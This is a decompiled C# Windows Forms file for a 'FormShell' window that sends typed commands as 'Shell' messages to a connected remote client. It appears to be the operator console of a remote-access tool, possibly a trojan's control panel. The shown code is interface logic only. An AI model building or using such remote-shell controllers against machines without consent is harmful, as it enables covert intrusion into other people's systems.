using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x020000B5 RID: 181
	public partial class FormShell : FormMaterial
	{
		// Token: 0x060005A9 RID: 1449 RVA: 0x0005272B File Offset: 0x0005092B
		public FormShell()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x060005AA RID: 1450 RVA: 0x0005274C File Offset: 0x0005094C
		private void FormProcess_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
			this.rjTextBox1.textBox1.KeyDown += this._KeyClick;
			this.rjTextBox1.textBox1.KeyUp += this._KeyClick;
		}

		// Token: 0x060005AB RID: 1451 RVA: 0x000527B9 File Offset: 0x000509B9
		private void ChangeScheme(object sender)
		{
			this.richTextBox1.ForeColor = FormMaterial.PrimaryColor;
			this.rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060005AC RID: 1452 RVA: 0x000527DB File Offset: 0x000509DB
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x060005AD RID: 1453 RVA: 0x000527F0 File Offset: 0x000509F0
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x060005AE RID: 1454 RVA: 0x00052820 File Offset: 0x00050A20
		private void _KeyClick(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return && !string.IsNullOrEmpty(this.rjTextBox1.textBox1.Text))
			{
				if (this.rjTextBox1.textBox1.Text.ToLower() != "cls")
				{
					this.client.Send(new object[]
					{
						"Shell",
						this.rjTextBox1.textBox1.Text
					});
				}
				else
				{
					this.richTextBox1.Clear();
				}
				this.rjTextBox1.textBox1.Text = "";
			}
		}

		// Token: 0x0400047B RID: 1147
		public Clients client;

		// Token: 0x0400047C RID: 1148
		public Clients parrent;
	}
}
